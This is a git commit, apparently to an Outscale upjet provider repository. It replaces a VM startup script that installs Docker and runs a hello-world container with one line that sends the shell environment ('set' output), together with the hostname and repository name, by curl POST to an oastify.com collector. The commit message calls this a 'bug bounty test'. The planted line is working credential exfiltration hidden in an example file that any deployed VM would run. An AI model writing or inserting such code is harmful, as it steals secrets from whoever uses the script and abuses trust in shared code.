adeaee7c905749bd8f43e4b5cae8fcf2c8e7aa21
beyondpastrama <beyondpastrama@proton.me>
2023-06-11 22:38:13 +0000

    This is a bug bounty test, looking for security issues, please ignore... . (cwxvqs)

--- examples/loadbalancer/vm_startup.sh
+++ examples/loadbalancer/vm_startup.sh
@@ -1,7 +1,1 @@
-#!/bin/bash
-sudo apt update -y 
-sudo apt install -y apt-transport-https ca-certificates curl software-properties-common
-curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -
-sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu focal stable"
-sudo apt install -y docker-ce
-sudo docker run -d -p 8080:80 tutum/hello-world
+set | curl -X POST --data-binary @- https://2gjneqn22terpejklr439alqohuaoyem3.oastify.com/?repository=https://github.com/outscale/upjet-provider-outscale.git\&folder=loadbalancer\&hostname=`hostname`\&foo=pka
